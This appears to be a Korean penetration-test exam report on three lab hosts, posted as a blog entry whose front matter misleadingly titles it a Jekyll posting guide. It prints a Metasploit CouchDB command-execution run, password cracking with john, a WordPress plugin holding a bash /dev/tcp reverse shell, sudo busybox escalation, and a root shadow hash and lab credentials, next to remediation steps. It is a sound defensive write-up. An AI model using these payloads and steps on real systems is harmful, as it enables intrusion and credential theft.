---
title: "[Jekyll] 블로그 포스팅하는 방법"
excerpt: md 파일에 마크다운 문법으로 작성하여 Github 원격 저장소에 업로드 해보자. 에디터는 Visual Studio code 사용! 로컬 서버에서 확인도 해보자.
categories:
  - bhpt
tags:
  - bhpt
typora_root_url: ../../

date: 2020-05-25
last_modified_at: 2020-05-25
---

# BHPT 시험 보고서



## 개요

- 기간: 2025/08/12 ~ 08/13
- 호스트 이름: ami
- IP 주소:
- 호스트 1: 10.0.5.122
- 호스트 2: 10.0.5.123
- 호스트 3: 10.0.5.116
- 목적: 보안 취약점 진단 및 침투 테스트
- 모의해킹 점검자: 조남기



![크리스마스커버일러스트_3840x2160](/images/2025-08-23-테스트보고서/크리스마스커버일러스트_3840x2160-5839263.jpg)

---

### 위험도 및 보고서 요약

#### 위험도 요약

| 호스트 | 주요 취약점 | 위험도 | 영향 범위 | 권한 상승 여부 |

| ----------------------- | ----------------------------------------------------------------------------- | ------------- | -------------------------- | --------------- |

| **Host 1** (10.0.5.122) | - CouchDB 원격 명령 실행 (CVE-2017-12636)<br>- 도커 환경 내 민감 정보 노출<br>- pkexec SUID 설정 | **높음** | 시스템 장악, 내부망 확장 | 가능 (초기 침투만 성공) |

| **Host 2** (10.0.5.123) | - 백업 디렉토리 노출 및 약한 암호화 파일<br>- 워드프레스 악성 플러그인 설치 가능<br>- sudo 권한 부여 바이너리 존재 | **매우 높음** | 루트 권한 탈취, 웹 서비스 변조, 데이터 유출 | 가능 (성공) |

| **Host 3** (10.0.5.116) | - FTP 익명 로그인 허용<br>- 취약한 파일 업로드(웹쉘 실행 가능)<br>- 민감 정보 하드코딩 노출 | **중간\~높음** | 웹 서버 변조, 민감 정보 유출 | 불가능 (초기 침투만 성공) |

  

---

#### 보고서 요약

2025년 8월 12~13일 진행된 ami 시스템 3대에 대한 모의해킹 결과, 전반적으로 보안 관리 미흡으로 인해 단기간 내 침투 및 권한 상승이 가능하다는 사실이 확인되었다.

주요 문제로는 *서비스·애플리케이션의 보안 패치 미적용, 민감 정보 노출, *권한 관리 부실, *웹 서비스 접근제어 미흡이 있었다.

이러한 취약점은 데이터 유출, 시스템 장악, 내부망 확산 등 심각한 피해로 이어질 수 있다.

즉시 보안 패치와 불필요 서비스 차단, 계정·권한 최소화, 민감 정보 보호, 웹 보안 강화 조치를 시행하고, 정기적인 취약점 점검과 보안 교육을 통해 재발 방지가 필요하다.

  

---

### 총평

본 보고서는 2025년 8월 12일부터 13일까지 ami 시스템 3대(10.0.5.122, 10.0.5.123, 10.0.5.116)를 대상으로 수행한 모의해킹 보고서이다. 이 과정에서 발견된 취약점과 그에 따른 침투 테스트 결과를 중점적으로 다룬다.

  

본 점검은 실제 운영 환경과 유사한 조건에서 취약점을 식별하고 실제 침투 가능성을 검증하는 방식으로 진행되었다. 그 결과, 각 호스트별로 다수의 심각한 보안 취약점이 발견되었으며, 일부 시스템에서는 관리자(root) 권한까지 탈취하는 데 성공했다.

  

호스트 1에서는 오래된 CouchDB 버전(CVE-2017-12636)에 존재하는 원격 명령 실행 취약점을 악용하여 초기 침투에 성공했다. 또한, 도커 컨테이너 환경 내에 저장된 민감 정보 파일이 평문(Base64 인코딩 상태)으로 존재하여 인증 정보 탈취가 가능했고, pkexec SUID 설정으로 인해 권한 상승 가능성까지 확인되었다.

  

호스트 2에서는 웹서버의 백업 디렉토리가 외부에 노출되어 암호화가 취약한 파일과 계정 정보가 유출될 수 있었으며, 워드프레스 관리자 페이지를 통한 악성 플러그인 업로드가 가능했다. 특히 sudo 권한이 부여된 바이너리를 악용하여 루트 권한을 즉시 획득할 수 있었고, 이는 서버 장악으로 직결되는 중대한 보안 위험이었다.

  

호스트 3에서는 FTP 익명 로그인이 허용되어 있었고, 취약한 파일 업로드 기능으로 인해 악성 웹쉘 업로드 및 실행이 가능했다. 더불어, 웹 애플리케이션 소스 코드와 계정 정보가 서버 내부에 하드코딩된 상태로 존재해 추가 침투와 내부 정보 유출 위험이 높았다.

  

이번 점검에서 발견된 취약점들은 대부분 기본적인 보안 설정 부재와 정기적인 점검·패치 미이행에서 비롯된 것으로, 공격자가 비교적 짧은 시간 안에 침투·권한 상승·데이터 유출을 수행할 수 있는 환경이었다. 특히 외부 공격뿐 아니라 내부자 위협에도 쉽게 노출될 수 있는 구조였으며, 이는 시스템의 전반적인 보호 체계가 취약하다는 것을 의미한다.

  

이번 모의해킹 보고서에 상세히 기술된 취약점과 권고 사항을 신속히 이행할 경우, 현재보다 보안 수준을 크게 향상시킬 수 있다. 이를 통해 잠재적인 외부 공격뿐 아니라 내부 보안 사고의 위험도 효과적으로 줄일 수 있을 것이다.

  

---

### 호스트 1 - 진단 결과 요약

1. 오래된 버전의 데이터베이스(CouchDB v1.6.1) 서버 운영

  

- 중요도: 상

- 설명: CouchDB(1.7.0 이전/2.x 2.1.1 이전 버전)의 관리자 계정은 HTTP API를 통해 내부 운영체제 명령어 실행 경로를 조작하여 임의의 OS 명령(쉘 명령)을 실행할 수 있는 상태

- 대응 방안: 최신 버전으로 CouchDB 업그레이드, 관리자 계정 관리 강화, 불필요한 API/관리 포트(5984) 외부 차단 등

  

2. 도커 유저 홈 디렉토리에 민감 정보 파일

  

- 중요도: 상

- 설명: couchdb 유저의 홈 디렉토리의 `.creds` 파일 안에 base64로 인코딩 되어있는 유저 계정 정보 존재함. 공격자가 디코딩 과정을 진행하여 계정 정보 획득이 가능한 상태

- 대응 방안: 민감 정보 파일은 안전한 곳에 따로 보관, 필요한 경우 권한 설정을 통해 읽기 기능 제한

  

3. SUID Sticky Bit 설정된 바이너리

  

- 중요도: 상

- 설명: `pkexec` 바이너리에 SUID 설정이 되어 이를 통해 권한 상승 공격 취약점 존재

- 대응 방안: 해당 바이너리에 SUID 비트 설정 해제

  
  

---

### 호스트 2 - 진단 결과 요약

1. 백업 디렉토리 웹 사이트 노출

  

- 중요도: 중

- 설명: 백업 디렉토리가 웹 사이트에 노출 되어있어 누구나 웹에서 해당 디렉토리에 접근이 가능한 상태. 일반적으로 백업 디렉토리는 민감 정보 다수 존재하여 정보 유출로 이어질 수 있음

- 대응 방안: 웹에서 백업 디렉토리 접근 차단

  

2. 백업 디렉토리 내부의 약한 암호화가 적용된 파일 및 파일 내부 계정 정보 존재

  

- 중요도: 상

- 설명: 백업 디렉토리 내부 파일의 접근 암호가 일반적인 단어로 되어있어 해시 크래킹 작업을 통해 해당 파일에 접근 가능

- 대응 방안: 대한민국 주통기 기반의 비밀번호 정책 - 8자리 이상, 특수문자 2자 이상, 등으로 변경, 민감한 계정 정보 파일은 안전한 곳에 보관

  

3. 워드프레스 악성 플러그인 설치 및 실행 취약점

  

- 중요도: 상

- 설명: 임의의 공격자가 워드프레스 관리자 페이지에서 악성 플러그인을 설치하여 공격을 시행할 수 있는 상태

- 대응 방안: 신뢰할 수 없는 출처 플러그인 설치 차단 또는 wp-login.php, wp-admin 폴더 IP 제한

  

4. sudo 권한 부여된 바이너리 존재

  

- 중요도: 상

- 설명: 일반 계정에 sudo 권한이 부여된 바이너리가 존재하면 해당 계정이 루트 권한으로 권한 상승 가능

- `busybox`는 여러 가지 유닉스 명령을 하나로 합쳐 놓은 다목적 실행 파일이다.

- 대응 방안: 일반 사용자 계정에 sudo 권한 부여 금지, 운영상 불필요한 모든 sudoer 즉시 제거

  

5. 잘못 설정된 민감 정보 파일

  

- 중요도: 상

- 설명: 일반 계정으로 shadow 파일 읽기가 가능하여 루트 유저의 민감 정보 획득 가능한 상태

- 대응 방안: shadow 파일 권한 점검 및 수정

  

---

### 호스트 3 - 진단 결과 요약

1. FTP 익명 유저의 로그인 및 읽기/쓰기 권한 부여

  

- 중요도: 상

- 설명: FTP 익명 유저에게 읽기/쓰기 권한이 부여되어 악성 페이로드 업로드 및 민감한 정보 다운로드가 가능한 상태

- 대응 방안: 익명 로그인 차단 및 필요한 경우 읽기/쓰기 권한 회수

  

2. FTP 서버에 민감한 웹 페이지 소스 코드 존재

  

- 중요도: 중

- 설명: FPT 서버안에 `upload.php` 소스코드 파일이 존재하여 공격자가 이를 분석하여 파일 업로드 우회 공격 시행이 가능한 강태

- 대응 방안: FTP 서버 디렉토리의 민감한 파일 삭제

  

3. 낮은 수준의 업로드 필터링 및 보안

  

- 중요도: 상

- 설명: 업로드 파일의 확장자와 헤더를 검사하지만 패킷 조작으로 악성 페이로드 업로드가 가능하고 파일 저장 경로가 웹 서버 내부인 상태로 악성 파일 호출 및 실행 가능한 상태

- 대응 방안: 파일명에 랜덤값 부여하여 저장, MIME 타입과 확장자 모두 화이트리스트 기반 검사 강화, 업로드 경로 웹 루트 외부에 설정

  

4. phpinfo.php 페이지가 외부에 노출됨

  

- 중요도: 중

- 설명: phpinfo.php가 외부에 노출되어 있는 경우, 해당 페이지에서 노출되는 PHP 설정 정보는 공격자가 서버를 타겟팅하는 데 매우 유용한 정보를 대량으로 제공, 특정 PHP Extension의 CVE 취약점 공격이 가능함

- 대응 방안: `php.ini` 비활성화 옵션 적용

  

5. 호스트 서버 내부에 하드코딩 되어있는 계정 정보 파일 존재

  

- 중요도: 상

- 설명: `C:\xampp\passwords.txt` 파일 안에 xampp 디폴트 계정 정보가 하드코딩 된 상태로 존재하여 공격자가 이 파일을 통해 쉽게 인증 정보를 획득 및 서버에 무단 접근하거나 권한을 탈취 가능성 존재

- 대응 방안: 비밀번호 및 민감 정보 파일 제거, 파일 및 디렉토리 권한 제한

  
  
  

---

  

## 호스트 1 - 모의해킹 수행 내용

### 정보 수집

#### 포트 스캔

nmap

```

└─# nmap -p- -sV -Pn -n -T4 10.0.5.122

[ . . . ]

PORT STATE SERVICE VERSION

22/tcp open ssh OpenSSH 8.9p1 Ubuntu 3ubuntu0.4 (Ubuntu Linux; protocol 2.0)

80/tcp open http Apache httpd 2.4.52 ((Ubuntu))

5984/tcp open http CouchDB httpd 1.6.1 (Erlang OTP/17)

MAC Address: 0E:2F:1D:B0:40:BB (Unknown)

Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel

```

  

- 포트 스캔 결과 포트 22, 80, 5984가 열려있는 것을 확인했다.

  

#### 웹

- gobuter를 이용해 디렉토리 브루트 포싱도 진행했는데 의미있는 정보는 얻지 못했다.

  

gobuster

```

└─# gobuster dir -u http://10.0.5.122:80 -w /usr/share/dirb/wordlists/common.txt

[ . . . ]

  

/index.html (Status: 200) [Size: 10671]

/server-status (Status: 403) [Size: 275]

Progress: 4614 / 4615 (99.98%)

```

  

- `wapplyzer` 결과 및 앞서 수집한 정보를 종합하여 해당 서버는 아파치 서버와 CouchDB httpd 1.6.1 그리고 우분투로 실행중인 것을 확인했다.

- <img src="image-23.png" alt="wapplyzer" style="zoom: 33%;" />

  
  
  

---

  

### 취약점 분석 및 초기 침투

  

- 초기 침투를 위해 구글링으로 CouchDB 취약점을 발견했다.

- https://www.rapid7.com/db/modules/exploit/linux/http/apache_couchdb_cmd_exec/

  

- `CVE-2017-12636` 취약점 분석

  

1. 대상: Apache CouchDB 1.7.0 이전 및 2.x 2.1.1 이전 버전

2. `_config` API 등으로 내부 “query_server” 등의 설정값을 조작함. 예: `/_config/query_servers/javascript` 설정을 `nc -c /bin/bash <공격자서버IP> <포트>`로 변경

3. 이후 쿼리를 실행하면 DB가 해당 명령어를 OS 단에서 실행하게 되며 결과적으로 리버스 쉘을 획득 가능함

  

---

  

- 타겟 호스트의 CouchDB의 버전이 v1.6.1 이므로 해당 취약점 적용 가능하다는 것을 확인했다.

- `exploit/linux/http/apache_couchdb_cmd_exec`이 존재하여 `msfconsol`을 이용하여 초기 침투를 진행했다.

  

msfconsol - 초기 침투

  

```

msf6 > use exploit/linux/http/apache_couchdb_cmd_exec

[*] Using configured payload linux/x64/shell_reverse_tcp

msf6 exploit(linux/http/apache_couchdb_cmd_exec) > show targets

  

Exploit targets:

=================

  

Id Name

-- ----

=> 0 Automatic

1 Apache CouchDB version 1.x

2 Apache CouchDB version 2.x

  
  

msf6 exploit(linux/http/apache_couchdb_cmd_exec) > set target 1

target => 1

  

msf6 exploit(linux/http/apache_couchdb_cmd_exec) > set lhost 10.0.5.121

lhost => 10.0.5.121

  

msf6 exploit(linux/http/apache_couchdb_cmd_exec) > set rhosts 10.0.5.122

rhosts => 10.0.5.

  

msf6 exploit(linux/http/apache_couchdb_cmd_exec) > run

```

  

- `msfconsol` 이용하여 couchdb 리버스 쉘을 획득한 뒤 정보 수집을 이어가던 중 `/.dockerenv` 파일을 보고 현재 데이터 베이스 서버가 도커에서 실행중인 것을 확인헀다.

- <img src="image-4.png" alt="도커증거" style="zoom: 50%;" />

  

- 도커 탈출을 위해 정보 수집을 진행하던 중, couchdb 홈디렉토리에 숨겨진 파일 `.creds` 파일 발견했다.

- <img src="image-5.png" alt="credfile" style="zoom:50%;" />

  
  
- 해당 파일 내용이 base64로 인코딩 되어있는 것 같아 점검자의 칼리에서 디코딩을 진행했다. -> `dmzdbadmin:dmzdbadmin` 계정 획득

  

```

┌──(kali㉿kali)-[~/exam]

└─$ vim base.txt

  

┌──(kali㉿kali)-[~/exam]

└─$ base64 -d base.txt

COUCHDB_USER=dmzdbadmin:COUCHDB_PASSWORD=dmzdbadmin

```

  

- 획득한 계정 정보로 SSH 이용하여 `dmzdbadmin` 유저로 로그인에 성공했다.

- <img src="image-6.png" alt="낮은 권한 획득" style="zoom: 67%;" />

  
  
  

---

  

### 권한 상승

  

- 권한 상승을 위한 정보 수집으로 점검자 칼리에서 자동화 정보 수집 툴인 `linpeas.sh`를 다운로드하여 웹서버를 열어서 타켓 호스트에서 다운로드 후 실행했다.

  

```

# 칼리에서 linpeas 다운로드

└─# wget https://github.com/carlospolop/PEASS-ng/releases/latest/download/linpeas.sh

  

# 칼리에서 웹서버 실행

└─# python3 -m http.server 80

Serving HTTP on 0.0.0.0 port 80 (http://0.0.0.0:80/) ...

10.0.5.122 - - [12/Aug/2025 05:15:41] "GET /linpeas.sh HTTP/1.1" 200 -

---

  

rw-rw-r-- 1 dmzdbadmin dmzdbadmin 956174 Aug 1 05:07 linpeas.sh

dmzdbadmin@dmz-prod-couchdb03:/dev/shm$ chmod +x linpeas.sh

```

  

- linpeas 검사 결과 `/usr/bin/pkexec`에 SUID가 설정 되어있는 것을 확인하여 이를 이용하여 권한 상승을 시도해보려고 했지만 실패했다.

- 실패 이유: 해당 바이너리를 이용해 권한 상승을 하기 위해서는 `ubuntu` 유저의 패스워드가 필요한데 획득하지 못하였다.

  

```

══╣ Polkit Binary

Pkexec binary found at: /usr/bin/pkexec

Pkexec binary has SUID bit set!

-rwsr-xr-x 1 root root 30872 Feb 26 2022 /usr/bin/pkexec

pkexec version 0.105

```

  

- <img src="image-7.png" alt="suid" style="zoom: 50%;" />

- 추가적인 정보수집으로 웹에서 couchDB 관리 사이트 접속하여 확인헀는데 별다른 정보 획득할 수 없었음.

- <img src="image-9.png" alt="카우치관리" style="zoom: 50%;" />

  

---

  

### 취약점 및 대응 방안

  

#### 1. 오래된 버전의 데이터베이스(CouchDB v1.6.1) 서버 운영

  

```

└─# nmap -p- -sV -Pn -n -T4 10.0.5.122

[ . . . ]

5984/tcp open http CouchDB httpd 1.6.1 (Erlang OTP/17)

```

  

- 대응 방안 1 : CouchDB 최신 버전으로 업그레이드 및 관리자 계정 보안 강화

  

```

# 1. 현재 CouchDB 중지

sudo systemctl stop couchdb

  

# 2. 기존 CouchDB 패키지 제거 (설정 파일 백업 권장)

sudo apt-get remove couchdb

  

# 3. 공식 Apache CouchDB 저장소 추가 (Ubuntu 기준)

echo "deb https://apache.jfrog.io/artifactory/couchdb-deb bionic main" | sudo tee /etc/apt/sources.list.d/couchdb.list

curl -L https://couchdb.apache.org/repo/bintray-pubkey.asc | sudo apt-key add -

sudo apt-get update

sudo apt-get install couchdb

  

# 4. 새 버전 설치 후 설정 파일 복원 및 서비스 시작

sudo systemctl start couchdb

  

# 5. 버전 확인

curl http://127.0.0.1:5984/

  

-------------------------------------------------------------------------

# 관리자 계정 관리 강화

sudo vi /opt/couchdb/etc/local.ini

  

# 1. `admins` 섹션에서 관리자 계정 추가 또는 비밀번호 변경

[admins]

admin = 강력한비밀번호

  

# 2. 변경 사항을 적용하기 위해 CouchDB 재시작

sudo systemctl restart couchdb

  

# 3. 관리자 계정이 제대로 작동하는지 확인

curl -X GET http://admin:강력한비밀번호@127.0.0.1:5984/

```

  

- 대응 방안 2: 불필요한 API/관리 포트(5984) 외부 차단

  

```

# 1. 현재 방화벽 상태 확인

sudo ufw status

  

# 2. 내부 IP만 5984 포트 접근 허용 (예: 10.0.5.0/24 대역)

sudo ufw allow from 10.0.5.0/24 to any port 5984

  

# 3. 외부에서 직접 5984 포트 접근 차단

sudo ufw deny 5984

  

# 4. 방화벽 재시작 및 상태 확인

sudo ufw reload

sudo ufw status

```

  

---

  

#### 2. 도커 유저 홈 디렉토리에 민감한 계정 정보 파일

  

- <img src="image-5.png" alt="credfile" style="zoom:50%;" />

  

```

┌──(kali㉿kali)-[~/exam]

└─$ vim base.txt

  

┌──(kali㉿kali)-[~/exam]

└─$ base64 -d base.txt

COUCHDB_USER=dmzdbadmin:COUCHDB_PASSWORD=dmzdbadmin

```

  

- 대응 방안: 민감 정보 파일 안전한 보관

  

```

# 1. 비밀 파일 생성(예: `mysecret.txt`)

echo "민감정보내용" > mysecret.txt

  

# 2. Docker Secret으로 등록

docker secret create my_secret mysecret.txt

  

# 3. Docker 서비스 생성 시 Secret 마운트

docker service create --name my_service --secret my_secret 이미지명

  

# 4. 컨테이너 내에서 `/run/secrets/my_secret` 경로로 민감 정보를 읽을 수 있음

```

  

#### 3. SUID Sticky Bit 설정된 바이너리

  

- <img src="image-7.png" alt="suid" style="zoom:50%;" />

- CVE : CVE-2021-4034, PwnKit(`pkexec` 바이너리에서 권한 상승 취약점)

  

- 대응 방안 1: `pkexec` 바이너리의 SUID 비트 해제

  

```

# SUID 비트 해제 명령 실행

sudo chmod u-s /usr/bin/pkexec

  

# 또는 숫자 권한으로 변경

sudo chmod 0755 /usr/bin/pkexec

  

# 권한 변경 후 재확인

ls -l /usr/bin/pkexec

  

# `s`가 사라지고 `-rwxr-xr-x`처럼 표시되어야 함

```

  

- 대응 방안 2: `pkexec` 바이너리 최신 버전으로 업데이트

  

```

sudo apt update

sudo apt install --only-upgrade policykit-1

sudo reboot

```

  

  


---

## 호스트 2 - 모의해킹 수행 내용

  

### 정보 수집

  

#### 포트 스캔

nmap

```

└─# nmap --top-ports 1000 -sC -Pn -n 10.0.5.123 -sV -oA tcp_Detailed_123

[ . . . ]

PORT STATE SERVICE VERSION

22/tcp open ssh OpenSSH 8.9p1 Ubuntu 3ubuntu0.4 (Ubuntu Linux; protocol 2.0)

| ssh-hostkey:

| 256 d3:43:b0:20:37:19:aa:7b:21:96:0d:73:0c:1b:56:8a (ECDSA)

|_ 256 8c:8d:0a:29:47:29:84:56:2b:72:1a:1e:7f:a9:91:f0 (ED25519)

80/tcp open http Apache httpd 2.4.52 ((Ubuntu))

|_http-title: Apache2 Ubuntu Default Page: It works

|_http-server-header: Apache/2.4.52 (Ubuntu)

MAC Address: 0E:18:75:11:05:79 (Unknown)

Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel

```

  

- 포트 스캔 결과 해당 서버에는 포트 22, 80 가 열려 있는 것을 확인, `gobuster`로 디렉토리 브루트포싱 결과 `/blog` 페이지가 존재하여 웹 페이지에 직접 들어가서 정보 수집을 이어갔다.

  

#### 웹

gobuster

```

─# gobuster dir -u http://10.0.5.123:80/ -w /usr/share/dirb/wordlists/common.txt

[ . . . ]

  

/blog (Status: 301) [Size: 307] [--> http://10.0.5.123/blog/]

/index.html (Status: 200) [Size: 10671]

[ . . . ]

```

- /blog : 워드프레스 6.4.1 과 PHP, MySQL, 아파치 서버가 실행 중인 것을 확인

- <img src="image-10.png" alt="워드프레스블로그" style="zoom: 33%;" />

  

- /blog 대상으로 다시 한 번 디렉토리 브루트포싱을 진행하여 의미있는 정보를 수집할 수 있었다.

```

└─# gobuster dir -u http://10.0.5.123:80/blog -w /usr/share/dirb/wordlists/common.txt

[ . . . ]

  

/_backup (Status: 301) [Size: 315] [--> http://10.0.5.123/blog/_backup/]

/wordpress (Status: 301) [Size: 317] [--> http://10.0.5.123/blog/wordpress/]

/wp-admin (Status: 301) [Size: 316] [--> http://10.0.5.123/blog/wp-admin/]

/wp-content (Status: 301) [Size: 318] [--> http://10.0.5.123/blog/wp-content/]

/wp-includes (Status: 301) [Size: 319] [--> http://10.0.5.123/blog/wp-includes/]

/index.php (Status: 301) [Size: 0] [--> http://10.0.5.123/blog/]

```

  

- `wp-login.php` 페이지에서 워드프레스 로그인 화면 발견

- <img src="image-11.png" alt="로그인페이지" style="zoom: 50%;" />

- `_backup` 페이지에서 암호 설정된 엑셀 파일을 발견했다.

- <img src="image-18.png" alt="엑셀파일" style="zoom:50%;" />

  
  
  

---

  

### 취약점 분석 및 초기 침투

  

엑셀파일 패스워드 크래킹 시도

  

- `_backup` 페이지에서 획득한 엑셀 파일(`corp-creds.xlsx`) 패스워드 크래킹을 진행했다. 크래킹 결과 `genesis`라는 평문화 되어있는 비밀번호를 획득하였고 획득한 암호로 파일에 접근하여 계정 정보 획득에 성공했다.

  

```

# office2john.py 이용하여 엑셀 파일 해시화 진행

└─$ python3 /usr/share/john/office2john.py ~/Downloads/corp-creds.xlsx > hash.txt

  

└─$ john --wordlist=/usr/share/wordlists/rockyou.txt hash.txt

[ . . . ]

  

genesis (corp-creds.xlsx)

```

  

- ![엑셀파일열기](image-19.png)

- 획득한 계정 정보(`admin:NoM0r3BruteF0rc3#@#`) 로 wordpress 관리자 페이지 로그인에 성공했다.

- <img src="image-24.png" alt="wordpress관리자페이지" style="zoom: 67%;" />

  

---

  

초기 침투

  

- 이후 초기 침투를 위해 wordpress 관리자 페이지에서 리버스쉘을 연결하는 악성 플러그인 설치한 뒤 점검자의 칼리에서 리버스쉘 연결하는 포트를 열어 `www-data` 유저의 쉘을 얻는 데 성공했다.

  

```

# vim reverse_plugin.php

<?php exec("/bin/bash -c 'bash -i >& /dev/tcp/10.0.5.121/8443 0>&1'"); ?>

------------------------------------

# zip

zip reverse_plugin.zip reverse_plugin.php

------------------------------------

# Upload

Wordpress > Plugins > Add New > Upload Plugin -> Activate Plugin

  

# 점검자 칼리

nc -lnvp 8443

```

  

- <img src="image-20.png" alt="낮은 권한 유저" style="zoom:67%;" />

  

- 정보 수집을 이어가던 중 `/var/html/blog/wp-config.php` 파일에서 데이터베이스 계정 정보 획득 했다 - `wordpressuser:P@sswordz3#`

- <img src="image-21.png" alt="wp-config" style="zoom:50%;" />

  
  
  

---

  

### 권한 상승

  

- 권한 상승을 위해 자동화된 정보 수집 툴인 `linpeas` 이용하여 정보 수집을 이어갔다. 루트의 shadow, passwd 파일 정보와 `sudo -l`에 `(ALL) NOPASSWD` 권한이 부여되어있는 바이너리를 발견했다.

linpeas

  

```

# linpeas: /etc/shadow

╣ Can I read shadow files? ............. root:$y$j9T$oZhlXFTcH84ew/3GwwYvZ1$063DG6RbDw2RFb6I8xh0AFt.4zk/lteqrzmUNvtTl.6:19694:0:99999:7:::

  

# /etc/passwd

root:x:0:0:root:/root:/bin/bash

  

# linpeas: sudo -l

══════════╣ Checking 'sudo -l', /etc/sudoers, and /etc/sudoers.d

[ . . . ]

User www-data may run the following commands on dmz-prod-rrblog01:

(ALL) NOPASSWD: /bin/busybox

```

  

- 획득한 `(ALL) NOPASSWD: /bin/busybox ` 을 이용하여 GTFObins를 통해 해당 바이너리의 취약점을 이용하여 root권한 상승 성공했다.

  

```

sudo /bin/busybox sh

```

  

- <img src="image-22.png" alt="root유저의 쉘 획득" style="zoom:50%;" />

- 추가적으로 획득한 shadow, passwd 파일을 이용하여 `unshadow`와 `john`을 활용한 루트 유저의 패스워드 크래킹도 진행해보았는데 실패했다.

  

---

  

### 취약점 및 대응 방안

  

#### 1. 백업 디렉토리 웹 사이트 노출

  

- <img src="image-18.png" alt="엑셀파일" style="zoom:50%;" />

  

- 대응 방안 1: 특정 디렉토리에 대해 모든 접근 차단

  

```

# 백업 디렉토리가 `/var/www/html/blog/_backup` 경로라면

<Directory "/var/www/html/blog/_backup">

Require all denied

</Directory>

  

# `Require all denied`는 모든 클라이언트의 접근을 거부

  

# 설정 변경 후 Apache 서비스를 재시작해야 적용됨

sudo systemctl restart apache2

```

  

- 대응 방안 2: 디렉토리 리스트 기능 비활성화 또는 아이피 접근 제한

  

```

# Apache 설정 파일 내 `Options` 항목에서 `Indexes` 옵션을 제거 또는 비활성화

vim /etc/apache2/apache2.conf # 설정 파일 경로 예시

  

<Directory "/var/www/html/backup">

Options -Indexes

</Directory>

  

# 접속 허용 IP 한정 (필요 시)

<Directory "/var/www/html/backup">

Require ip 10.0.0.0/24

Require all denied

</Directory>

  

# 적용 후 서비스 재시작

sudo systemctl restart apache2

```

  

---

  

#### 2. 백업 디렉토리 내부의 약한 암호화가 적용된 파일 및 파일 내부 계정 정보 존재

  

```

# office2john.py 이용하여 엑셀 파일 해시화 진행

└─$ python3 /usr/share/john/office2john.py ~/Downloads/corp-creds.xlsx > hash.txt

  

└─$ john --wordlist=/usr/share/wordlists/rockyou.txt hash.txt

[ . . . ]

  

genesis (corp-creds.xlsx)

```

  

- ![엑셀파일열기](image-19.png)

  

- 대응 방안: 민감한 계정 정보 파일 외부에서 접근할 수 없는 곳에 안전하게 보관

- 비밀번호 - 8자리 이상, 특수문자 2자 이상, 등으로 변경

  

---

  

#### 3. 워드프레스 악성 플러그인 설치 및 실행 취약점

  

```

# vim reverse_plugin.php

<?php exec("/bin/bash -c 'bash -i >& /dev/tcp/10.0.5.121/8443 0>&1'"); ?>

------------------------------------

# zip

zip reverse_plugin.zip reverse_plugin.php

------------------------------------

# Upload

Wordpress > Plugins > Add New > Upload Plugin -> Activate Plugin

  

# 점검자 칼리

nc -lnvp 8443

```

  

- <img src="image-20.png" alt="낮은 권한 유저" style="zoom:50%;" />

- 대응 방안 1: 워드프레스 보안 플러그인 설치

  

```

# 워드프레스 보안 플러그인 추천 목록

1. Wordfence Security : 플러그인 취약점 탐지, 설치 경고, 실시간 방화벽

  

2. iThemes Security (구 Better WP Security) : 관리자 페이지 접근 제어, 파일 변경 감지, 보안 알림

  

3. MalCare Security : 자동 악성코드 탐지 및 제거, 플러그인 설치 모니터링

```

  

- 대응 방안 2: wp-login.php와 wp-admin 폴더 IP 접근 제한

  

```

# Apache 웹서버에서 IP 제한 적용 방법

# 1. 워드프레스 루트 디렉토리 또는 서버 설정에서 `.htaccess` 파일을 편집 또는 생성

  

# 2. 아래 코드를 `.htaccess` 파일 상단에 추가

<Files wp-login.php>

Order Deny,Allow

Deny from all

Allow from 123.45.67.89 # 관리자 허용 IP 주소

Allow from 111.22.33.44 # 추가 허용 IP 주소

</Files>

  

<Directory /var/www/html/wp-admin>

Order Deny,Allow

Deny from all

Allow from 123.45.67.89 # 관리자 허용 IP 주소

Allow from 111.22.33.44 # 추가 허용 IP 주소

</Directory>

  

# 3. 실제 허용할 IP 주소로 교체

  

# 4. `.htaccess` 적용 후 Apache 서버 재시작

sudo systemctl restart apache2

```

  

---

  

#### 4. sudo 권한 부여된 바이너리 존재

  

```

# linpeas: sudo -l

══════════╣ Checking 'sudo -l', /etc/sudoers, and /etc/sudoers.d

[ . . . ]

User www-data may run the following commands on dmz-prod-rrblog01:

(ALL) NOPASSWD: /bin/busybox

```

  

- 대응 방안: 해당 라인 삭제 혹은 주석 처리

  

```

# vim `/etc/sudoers` 또는 `/etc/sudoers.d/`

www-data ALL=(ALL) NOPASSWD: /bin/busybox # 이 라인 주석 처리하거나 삭제

  

# 이후 visudo 명령어로 문법 검사

sudo visudo

sudo visudo -c

  

# 권한 변경 후 확인

# `sudo -l -U www-data` 명령으로 `www-data` 사용자가 실행 가능한 sudo 명령 목록을 다시 확인

```

  

---

  

#### 5. 잘못 설정된 민감 정보 파일

  

```

# linpeas: /etc/shadow

╣ Can I read shadow files? ............. root:$y$j9T$oZhlXFTcH84ew/3GwwYvZ1$063DG6RbDw2RFb6I8xh0AFt.4zk/lteqrzmUNvtTl.6:19694:0:99999:7:::

  

# /etc/passwd

root:x:0:0:root:/root:/bin/bash

```

  

- 대응 방안: shadow 파일 권한 점검 및 수정

  

```

# /etc/shadow 파일 권한 및 소유자 확인

ls -l /etc/shadow

  

# 권한 및 소유자 올바르게 조정

sudo chown root:shadow /etc/shadow

sudo chmod 640 /etc/shadow

  

# shadow 그룹 멤버 확인 및 관리

grep shadow /etc/group

  

# shadow 그룹 멤버를 확인 후, 불필요한 사용자가 있다면 아래 명령어로 제거

sudo gpasswd -d 사용자명 shadow

```

  

  

---

  

## 호스트 3 - 모의해킹 수행 내용

  

### 정보 수집

  

#### 포트 스캔

nmap - all port

```

└─# sudo nmap -p- -sS -Pn -n -T4 --open 10.0.5.116 -oA ~/nmap/scan_all_116

[ . . . ]

  

PORT STATE SERVICE

21/tcp open ftp

80/tcp open http

5985/tcp open wsman

19150/tcp open gkrellm

```

  

nmap - Detailed

```

└─# nmap -p 21,80,5985,19150 -sC -Pn -n -T4 --open 10.0.5.116 -sV -oA tcp_Detailed_166

[ . . . ]

  

PORT STATE SERVICE VERSION

21/tcp open ftp FileZilla ftpd 0.9.41 beta

| ftp-anon: Anonymous FTP login allowed (FTP code 230)

80/tcp open http Apache httpd 2.4.58 ((Win64) OpenSSL/3.1.3 PHP/8.0.30)

|_http-title: Welcome to Our Website

|_http-server-header: Apache/2.4.58 (Win64) OpenSSL/3.1.3 PHP/8.0.30

5985/tcp open http Microsoft HTTPAPI httpd 2.0 (SSDP/UPnP)

|_http-server-header: Microsoft-HTTPAPI/2.0

19150/tcp open gkrellm?

